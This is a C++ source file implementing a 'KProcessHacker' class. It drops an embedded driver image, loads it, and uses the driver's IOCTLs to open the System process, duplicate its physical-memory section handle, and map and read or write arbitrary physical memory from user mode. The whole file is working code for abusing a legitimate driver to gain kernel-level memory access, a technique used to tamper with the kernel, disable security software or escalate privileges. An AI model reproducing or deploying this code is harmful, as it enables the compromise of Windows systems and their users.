#include "kprocesshacker.h"
#include "kph_shellcode.h"


KProcessHacker::KProcessHacker()
	: Driver(KPH_FILE_NAME, KPH_SERVICE_NAME, KPH_DEVICE_NAME)
{
	driverImagePresent =
		util::DumpBinaryImage(util::ToA(KPH_FILE_NAME), kphShellCode, sizeof(kphShellCode));
}


/// <summary> Load the driver process and get handle to it.
///  Also initialize physical memory mapping </summary>
/// <returns> bool: [true:initialization success]</returns>
bool KProcessHacker::InitDriver()
{
	if (!LoadDriver()) return false;
	return true;
}


/// <summary> Get handle to physical memory and memory mapping information</summary>
/// <returns> bool: [true:initialization success]</returns>
bool KProcessHacker::InitPhysicalMemory()
{
	if (GetHandleToPhysicalMemory()) {
		if (!GetPhysicalMemoryMappingInformation())
		{
			CloseHandle(hPhysicalMemory); return false;
		}
		return true;
	}
	return false;
}


/// <summary> Obtain an handle to physical memory </summary>
/// <returns> bool: [true: success]</returns>
bool KProcessHacker::GetHandleToPhysicalMemory()
{
	if (hPhysicalMemory && hPhysicalMemory!= INVALID_HANDLE_VALUE) return true;

	// Find Physical Memory Handle
	//---------------------------------
	HANDLE_LIST handles = FindHandleByName(PHYSICAL_MEM_HANDLE_NAME, SYSTEM_PID, -1);
	if (handles.size() <= 0) return false;

	// Duplicate first handle in list
	//---------------------------------
	HANDLE hSrc = KPHOpenProcess(PROCESS_ALL_ACCESS, SYSTEM_PID);
	if (hSrc == INVALID_HANDLE_VALUE)	return false;
	HANDLE hDst = KPHOpenProcess(PROCESS_ALL_ACCESS, GetCurrentProcessId());
	if (hDst == INVALID_HANDLE_VALUE) { CloseHandle(hSrc); return false; }

	hPhysicalMemory = KPHDuplicateObjectHandle(handles[0], hSrc, hDst, PROCESS_ALL_ACCESS);

	CloseHandle(hSrc); CloseHandle(hDst);

	if (hPhysicalMemory > 0) return true;

	return false;
}


/// <summary> Get physical memory layout information.</summary>
/// <returns> bool: [true: success]</returns>
bool KProcessHacker::GetPhysicalMemoryMappingInformation()
{
	reg::PKEY_VALUE_PARTIAL_INFORMATION buffer = nullptr;
	if (!reg::Key::QueryRegistryKeyValue(KEY_PHYSICAL_MEMORY_MAP, KEY_PHYSICAL_MEMORY_MAP_VALUE_NAME, (void**)& buffer, reg::KeyValuePartialInformation))
		return false;

	pcm::PCM_FULL_RESOURCE_DESCRIPTOR pcmResDesc = ((pcm::PCM_RESOURCE_LIST)buffer->Data)->List;
	pcm::PCM_PARTIAL_RESOURCE_LIST pcmPartialList = &(pcmResDesc[0].PartialResourceList);
	pcm::PCM_PARTIAL_RESOURCE_DESCRIPTOR pcmResource = pcmPartialList->PartialDescriptors;

	this->memoryMap.clear();

	for (int i = 0; i < pcmPartialList->Count; i++)
	{
		switch (pcmResource[i].Type)
		{
		case pcm::CmResourceTypeMemory:
			this->memoryMap.push_back(
				MEMORY_MAP_ENTRY{ pcmResource[i].u.Memory.Start , pcmResource[i].u.Memory.Length }
			);
			break;

		case pcm::CmResourceTypeMemoryLarge:
			ULONG memorySize = pcmResource[i].u.Memory.Length;
			if (CM_RESOURCE_MEMORY_LARGE_40(pcmResource[i].Flags))	// max len 0x0000 00FF FFFF FF00
				memorySize = memorySize << 8;
			if (CM_RESOURCE_MEMORY_LARGE_48(pcmResource[i].Flags))	// max len  0x0000 FFFF FFFF 0000
				memorySize = memorySize << 16;
			if (CM_RESOURCE_MEMORY_LARGE_64(pcmResource[i].Flags))	// max len 0xFFFF FFFF 0000 0000
				memorySize = memorySize << 32;

			this->memoryMap.push_back(MEMORY_MAP_ENTRY{ pcmResource[i].u.Memory.Start , memorySize });
			break;
		}
	}

	free(buffer);

	if (this->memoryMap.size()) {
		std::sort(this->memoryMap.begin(), this->memoryMap.end(),
			[](MEMORY_MAP_ENTRY & a, const MEMORY_MAP_ENTRY & b) {
				return a.RegionStart.QuadPart < b.RegionStart.QuadPart;
			}
		);

		return true;
	}
	return false;
}


/// <summary> Map physical memory view to a processes virtual adress space </summary>
/// <param name="hProcess"> handle to process physical memory is being mapped to </param>
/// <param name="physicalAddress"> Base Physical address to start mapping </param>
/// <param name="sizeToMap"> Memory size to be mapped </param>
/// <param name="mappedVirtualAddress"> _OUT_ Virtual address physical memory is mapped to </param>
/// <param name="protection"> Permissions of the new mapped section </param>
/// <returns> bool </returns>
bool KProcessHacker::NtMapPhysicalMemory(
	HANDLE hProcess, void* physicalAddress, PSIZE_T sizeToMap, PVOID* mappedVirtualAddress, ULONG protection)
{
	if (hPhysicalMemory <= 0 || !*sizeToMap) return false;

	nt::_NtMapViewOfSection NtMapViewOfSection = (nt::_NtMapViewOfSection)util::GetExportFunctionAddress(L"ntdll.dll", "NtMapViewOfSection");

	LARGE_INTEGER		sectionOffset;

	*mappedVirtualAddress = nullptr;
	sectionOffset.QuadPart = (LONGLONG)physicalAddress;

	if (!NT_SUCCESS(
		NtMapViewOfSection(hPhysicalMemory, hProcess, mappedVirtualAddress, NULL,
			NULL, &sectionOffset, sizeToMap, nt::ViewShare, NULL, protection)
	))
		return false;

	return true;
}



/// <summary> Finds a handles to system objects </summary>
/// <param name="handleName"> Name of the object </param>
/// <param name="OwnerPID"> PID of the handle owner [ignored if less than -1  [-1 id current process]] </param>
/// <param name="dwDesiredAccess"> Desired permissions [ignored if -1]</param>
/// <returns> HANDLE_LIST </returns>
HANDLE_LIST	KProcessHacker::FindHandleByName(std::wstring handleName, int OwnerPID, DWORD desiredAccess)
{
	bool searchByOwnerPID = (OwnerPID < -1) ? false : true;
	bool searchByDesiredAccess = (desiredAccess < -1) ? false : true;

	HANDLE searchHandle = KPHOpenProcess(PROCESS_ALL_ACCESS, SYSTEM_PID);
	if (searchHandle == INVALID_HANDLE_VALUE) return {};

	// Get List of all system handles
	//-------------------------------
	nt::PSYSTEM_HANDLES pHandles = nullptr;
	if (!util::GetSystemInformation(nt::SystemHandleInformation, (void**)& pHandles, nullptr))			// Get system handles
		return {};

	// Enumerate the handles list
	//-------------------------------
	HANDLE_LIST foundHandles;
	for (int i = 0; i < pHandles->NumberOfHandles; i++) {
		nt::PSYSTEM_HANDLE_INFORMATION sysHandle = &pHandles->Handles[i];

		if (searchByOwnerPID && sysHandle->UniqueProcessId != OwnerPID)
			continue;

		if (searchByDesiredAccess && ((sysHandle->GrantedAccess & desiredAccess) != desiredAccess))
			continue;

		// Get name of handle object
		//-------------------------------
		nt::POBJECT_NAME_INFORMATION pObjName = nullptr; DWORD nameReturnLenth;
		if (!KPHQueryObjectInfor(searchHandle, sysHandle->HandleValue, KphObjectNameInformation,
			(void**)& pObjName, nullptr))
			continue;																						// Cannot Get Name

		if (pObjName->Name.Length > 0) {
			if (wcscmp(pObjName->Name.Buffer, handleName.c_str()) == 0) {
				foundHandles.push_back((HANDLE)sysHandle->HandleValue);
			}
		}

		free(pObjName);
	}

	if (pHandles) free(pHandles);																// Clean up
	CloseHandle(searchHandle);

	return foundHandles;
}



/// <summary> Query information about an object via driver </summary>
/// <param name="hProc"> handle to process requesting the information </param>
/// <param name="handleValue"> Value of Handle whose infor is needed</param>
/// <param name="kphObjInforClass"> type of information </param>
/// <param name="buffer"> Information output </param>
/// <param name="returnLength"> length of result </param>
/// <returns> bool </returns>
bool KProcessHacker::KPHQueryObjectInfor(HANDLE hProc,
	WORD handleValue, KPH_OBJECT_INFORMATION_CLASS kphObjInforClass, void** buffer, LPDWORD returnLength)
{
	if (*buffer != nullptr)	return false;

	size_t			bufferSize = 0;
	NTSTATUS		status = STATUS_SUCCESS;
	IO_STATUS_BLOCK isb;

#pragma pack(push)
#pragma pack(1)
	struct
	{
		HANDLE		ProcessHandle;
		HANDLE		Handle;
		KPH_OBJECT_INFORMATION_CLASS ObjectInformationClass;
		PVOID		ObjectInformation;
		uint64_t	ObjectInformationLength;
		PULONG		ReturnLength;
	} inputQueryObjectInfo = { hProc, (HANDLE)handleValue, kphObjInforClass, *buffer, 0, returnLength };
#pragma pack(pop)

	do
	{
		bufferSize += 0x200;
		void* tempMem = realloc(*buffer, bufferSize);					// Allocate memory for the buffer
		if (tempMem == nullptr) {										// avoid memory leaks
			status = STATUS_UNSUCCESSFUL;  break;
		}

		*buffer = tempMem;
		inputQueryObjectInfo.ObjectInformation = *buffer;
		inputQueryObjectInfo.ObjectInformationLength = bufferSize;

		status = NtDeviceIoControlFile(GetHandle(), nullptr, nullptr, nullptr, &isb, KPH_QUERYINFORMATIONOBJECT,
			&inputQueryObjectInfo, sizeof(inputQueryObjectInfo), nullptr, 0);

	} while (status == STATUS_INFO_LENGTH_MISMATCH);

	if (*buffer)
		if (NT_SUCCESS(status)) {
			if (returnLength != nullptr) * returnLength = bufferSize;
			return true;
		}
		else { free(*buffer); if (returnLength != nullptr) * returnLength = 0; }

	return false;
}



/// <summary> Duplicate an handle to an object via driver </summary>
/// <param name="hHandleToDup"> handle to be duplicated </param>
/// <param name="hSrcProc"> handle to owning process </param>
/// <param name="hDstProc"> handle to process receivig new handle </param>
/// <param name="desiredAccess"> Access mask for new handle </param>
/// <param name="hAttributes"> _opt_ attributes for new handle </param>
/// <param name="hOptions"> DUPLICATE_CLOSE_SOURCE or NULL only </param>
/// <returns> HANDLE </returns>
HANDLE KProcessHacker::KPHDuplicateObjectHandle(HANDLE hHandleToDup,
	HANDLE hSrcProc, HANDLE hDstProc, DWORD desiredAccess, DWORD hAttributes, DWORD hOptions)
{
	HANDLE duplicatedHandle = nullptr;
	IO_STATUS_BLOCK isb;

#pragma pack(push)
#pragma pack(1)
	struct
	{
		HANDLE		OwnerProcessHandle;		// Handle to process Owning the handle
		HANDLE		SourceHandle;			// Handle to duplicate
		HANDLE		TargetProcessHandle;	// Handle to process to own the duplicated handle
		PHANDLE		DuplicateHandle;		// Duplicated handle will be here
		uint64_t	DesiredAccess;			// Desired access for new handle
		ULONG		HandleAttributes;		// OBJ_KERNEL_HANDLE | NULL only
		ULONG		Options;				// DUPLICATE_CLOSE_SOURCE or NULL only
	} inputDuplicateHandle =
	{ hSrcProc, hHandleToDup, hDstProc, &duplicatedHandle, desiredAccess, hAttributes, hOptions };
#pragma pack(pop)

	int i = sizeof(inputDuplicateHandle);

	NTSTATUS status = NtDeviceIoControlFile(GetHandle(), nullptr, nullptr, nullptr, &isb, KPH_DUPLICATEOBJECT,
		&inputDuplicateHandle, sizeof(inputDuplicateHandle), nullptr, 0);
	if (NT_SUCCESS(status))
		return duplicatedHandle;

	return INVALID_HANDLE_VALUE;
}


/// <summary> Get handle to a process via driver </summary>
/// <param name="dwDesiredAccess"> Desired permissions </param>
/// <param name="procPID"> target process </param>
/// <returns> Handle to process</returns>
HANDLE KProcessHacker::KPHOpenProcess(DWORD dwDesiredAccess, DWORD procPID)
{
	HANDLE hProcess = INVALID_HANDLE_VALUE;
	CLIENT_ID clientId = {(HANDLE)procPID,(HANDLE)NULL};
	IO_STATUS_BLOCK isb;

#pragma pack(push)
#pragma pack(1)
	struct
	{
		PHANDLE		ProcessHandle;
		uint64_t	DesiredAccess;
		CLIENT_ID*	ClientId;
	} inputOpenProcess = { &hProcess, dwDesiredAccess, &clientId };
#pragma pack(pop)

	NTSTATUS status = NtDeviceIoControlFile(GetHandle(), nullptr, nullptr, nullptr,
		&isb, KPH_OPENPROCESS, &inputOpenProcess, sizeof(inputOpenProcess), nullptr, 0);

	return hProcess;
}


/// <summary> Read or write to a physical memory address </summary>
/// <param name="physicalAddress"> _IN_ The physical address </param>
/// <param name="size"> _IN_ Size to read/write </param>
/// <param name="inOutBuf"> _IN_ _OUT_ Buffer </param>
/// <param name="read"> true: read   false: write </param>
/// <returns> bool </returns>
bool KProcessHacker::KPHReadWritePhysicalAddress(void* physicalAddress, size_t size, void* inOutBuf, bool read)
{
	if (inOutBuf == nullptr || size == 0)	return false;

	// Verify that physical address lies within a system memory map
	//--------------------------------------------------------------
	int i;
	for (i = 0; i < memoryMap.size(); i++)
		if ((LONGLONG)physicalAddress > MEMORY_MAP_END(i, memoryMap))
			continue;
		else {
			if ((LONGLONG)physicalAddress >= MEMORY_MAP_BASE(i, memoryMap) &&		// falls within a map region
				((LONGLONG)physicalAddress + size) <= MEMORY_MAP_END(i, memoryMap))
			{
				// Allign 8bytes boundary
				LONGLONG	mapOffset = (LONGLONG)physicalAddress % MEMORY_READ_WRITE_ALIGNMENT;
				void* mapBase = (void*)((LONGLONG)physicalAddress - mapOffset);
				size_t	mapSize = size + mapOffset;

				PVOID	mappedVirtualAddress = nullptr;

				ULONG	protection = (read) ? PAGE_READONLY : PAGE_READWRITE;

				if (!NtMapPhysicalMemory(GetCurrentProcess(), mapBase, &mapSize, &mappedVirtualAddress, protection))
					return false;

				if (read)
					memcpy(inOutBuf, (void*)((LONGLONG)mappedVirtualAddress + mapOffset), size);
				else
					memcpy((void*)((LONGLONG)mappedVirtualAddress + mapOffset), inOutBuf, size);

				UnmapViewOfFile(mappedVirtualAddress);
				return true;
			}
			break;
		}

	return false;
}



KProcessHacker::~KProcessHacker()
{
}
